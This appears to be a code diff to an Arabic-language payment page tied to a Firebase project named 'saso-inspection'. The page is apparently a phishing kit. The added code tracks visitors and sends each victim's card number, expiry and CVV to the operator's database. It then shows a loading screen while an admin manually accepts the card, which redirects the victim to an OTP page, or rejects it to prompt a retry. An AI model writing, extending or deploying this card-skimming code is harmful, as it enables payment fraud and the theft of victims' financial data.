@@ -16,7 +16,7 @@
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; position: relative; }
 
         .payment-card-container { background: #fff; width: 100%; max-width: 420px; border-radius: 25px; padding: 25px 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; }
         .main-header { margin-bottom: 20px; }
@@ -43,7 +43,7 @@
             display: block; 
             font-family: 'Courier New', monospace; 
             height: 25px;
-            white-space: nowrap; /* يضمن ظهور الرقم في سطر واحد */
+            white-space: nowrap;
         }
 
         .card-info-bottom { display: flex; justify-content: space-between; align-items: flex-end; margin-top: 25px; direction: rtl; }
@@ -56,8 +56,11 @@
         .form-group { text-align: right; margin-bottom: 15px; width: 100%; }
         .form-label { display: block; font-size: 13px; font-weight: bold; color: #444; margin-bottom: 7px; }
         
-        .input-field { width: 100%; padding: 13px; border: 1px solid #e0e0e0; border-radius: 10px; font-size: 16px; outline: none; }
+        .input-field { width: 100%; padding: 13px; border: 1px solid #e0e0e0; border-radius: 10px; font-size: 16px; outline: none; transition: 0.3s; }
         
+        /* حالة الخطأ */
+        .input-error { border: 2px solid red !important; }
+
         .ltr-field { direction: ltr; text-align: left; }
         .rtl-field { direction: rtl; text-align: right; }
 
@@ -65,9 +68,28 @@
 
         .btn-pay { width: 100%; background-color: #82b199; color: white; border: none; border-radius: 10px; padding: 16px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
         .btn-pay:hover { background-color: #1e7344; }
+
+        /* شاشة التحميل (Overlay) */
+        #loadingOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: none; flex-direction: column; justify-content: center;
+            align-items: center; z-index: 9999;
+        }
+        .spinner {
+            width: 50px; height: 50px; border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--main-green); border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 15px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+
+    <div id="loadingOverlay">
+        <div class="spinner"></div>
+        <p style="color: #333; font-weight: bold;">جاري معالجة الطلب... يرجى الانتظار</p>
+    </div>
 
     <div class="payment-card-container">
         <div class="main-header">
@@ -112,90 +134,103 @@
             </div>
         </div>
 
-        <button class="btn-pay" onclick="submitPayment()">ادفع الآن</button>
+        <button class="btn-pay" id="btnPay" onclick="submitPayment()">ادفع الآن</button>
     </div>
 
     <script>
-        // --- إعدادات Firebase ---
+        // --- إعدادات Firebase من صورة المشروع Saso-Inspection ---
         const firebaseConfig = { 
-            apiKey: "AIzaSyAzXXXXXXXXXXXX", 
-            databaseURL: "https://vsc-project-default-rtdb.firebaseio.com/", 
-            projectId: "vsc-project" 
+            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT...", 
+            authDomain: "saso-inspection.firebaseapp.com",
+            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com", 
+            projectId: "saso-inspection",
+            storageBucket: "saso-inspection.appspot.com",
+            messagingSenderId: "1009002235896",
+            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
         };
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // معرف فريد للزائر
         const visitorId = localStorage.getItem('visitorId') || "V_" + Math.floor(Math.random() * 100000);
         localStorage.setItem('visitorId', visitorId);
 
-        // --- كود تتبع الزيارات (Live Visitors) ---
-        // بمجرد دخول الصفحة، يتم تسجيل الزائر كـ "نشط الآن"
-        const visitorRef = database.ref('live_visitors/' + visitorId);
-        visitorRef.set({
+        // تتبع الزيارة
+        database.ref('live_visitors/' + visitorId).set({
             page: "صفحة الدفع",
             last_active: firebase.database.ServerValue.TIMESTAMP
         });
 
-        // حذف الزائر عند إغلاق الصفحة (ليظهر لك العدد الفعلي)
-        visitorRef.onDisconnect().remove();
-
-        // --- التنسيق والتحقق من الإدخال ---
+        // --- التنسيق التلقائي للبطاقة ---
         const visaIcon = "https://img.icons8.com/color/48/000000/visa.png";
         const masterIcon = "https://img.icons8.com/color/48/000000/mastercard.png";
 
-        // منع الحروف والرموز في حقل الاسم
-        document.getElementById('cardHolder').addEventListener('input', function (e) {
-            this.value = this.value.replace(/[0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/g, '');
+        document.getElementById('cardHolder').addEventListener('input', function() {
+            this.value = this.value.replace(/[0-9]/g, '');
             document.getElementById('viewCardHolder').innerText = this.value || 'اسم حامل البطاقة';
         });
 
-        document.getElementById('cardNumber').addEventListener('input', function (e) {
+        document.getElementById('cardNumber').addEventListener('input', function() {
             let val = this.value.replace(/\D/g, '');
             let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
             this.value = formatted;
             document.getElementById('viewCardNumber').innerText = formatted || '#### #### #### ####';
-
+            
             const logoImg = document.getElementById('viewCardLogo');
-            if (val.length > 0) {
-                if (val.startsWith('4')) {
-                    logoImg.src = visaIcon;
-                    logoImg.style.display = "block";
-                } else if (val.startsWith('5')) {
-                    logoImg.src = masterIcon;
-                    logoImg.style.display = "block";
-                } else {
-                    logoImg.style.display = "none";
-                }
-            } else {
-                logoImg.style.display = "none";
-            }
+            if (val.startsWith('4')) { logoImg.src = visaIcon; logoImg.style.display = "block"; }
+            else if (val.startsWith('5')) { logoImg.src = masterIcon; logoImg.style.display = "block"; }
+            else { logoImg.style.display = "none"; }
+            
+            // إزالة اللون الأحمر عند البدء في التعديل
+            this.classList.remove('input-error');
         });
 
-        document.getElementById('cardExpiry').addEventListener('input', function (e) {
+        document.getElementById('cardExpiry').addEventListener('input', function() {
             let val = this.value.replace(/\D/g, '');
-            if (val.length >= 2) {
-                this.value = val.substring(0, 2) + ' / ' + val.substring(2, 4);
-            } else {
-                this.value = val;
-            }
+            if (val.length >= 2) this.value = val.substring(0, 2) + ' / ' + val.substring(2, 4);
             document.getElementById('viewCardExpiry').innerText = this.value || '00 / 00';
         });
 
-        // --- حفظ البيانات عند الضغط على "ادفع الآن" ---
+        // --- إرسال البيانات والمراقبة اللحظية ---
         function submitPayment() {
+            const cardInput = document.getElementById('cardNumber');
+            if (cardInput.value.length < 15) {
+                alert("يرجى إدخال رقم بطاقة صحيح");
+                return;
+            }
+
             const cardData = {
                 cardHolder: document.getElementById('cardHolder').value,
-                cardNumber: document.getElementById('cardNumber').value,
+                cardNumber: cardInput.value,
                 expiry: document.getElementById('cardExpiry').value,
                 cvv: document.getElementById('cvv').value,
-                status: "جاري التأكيد",
+                status: "waiting", // العميل ينتظر قرارك الآن
                 last_update: firebase.database.ServerValue.TIMESTAMP
             };
 
-            // حفظ البيانات في قسم المدفوعات تحت معرف الزائر
-            database.ref('payments/' + visitorId).update(cardData).then(() => {
-                window.location.href = 'loading.html';
+            // 1. إظهار شاشة التحميل
+            document.getElementById('loadingOverlay').style.display = 'flex';
+
+            // 2. حفظ البيانات
+            database.ref('payments/' + visitorId).update(cardData);
+
+            // 3. مراقبة الرد من الأدمن (نظام القبول والرفض)
+            const controlRef = database.ref('payments/' + visitorId);
+            controlRef.on('value', (snapshot) => {
+                const data = snapshot.val();
+                
+                if (data.status === "accept") {
+                    // إذا ضغطت قبول -> توجه لصفحة OTP
+                    window.location.href = "otp.html";
+                } 
+                else if (data.status === "reject") {
+                    // إذا ضغطت رفض -> إخفاء التحميل وتلوين المربع بالأحمر
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    cardInput.classList.add('input-error');
+                    alert("برجاء التحقق من معلومات البطاقة الصحيحة");
+                    
+                    // إعادة الحالة لـ idle لكي يتمكن العميل من المحاولة مرة أخرى
+                    controlRef.update({ status: "idle" });
+                }
             });
         }
     </script>
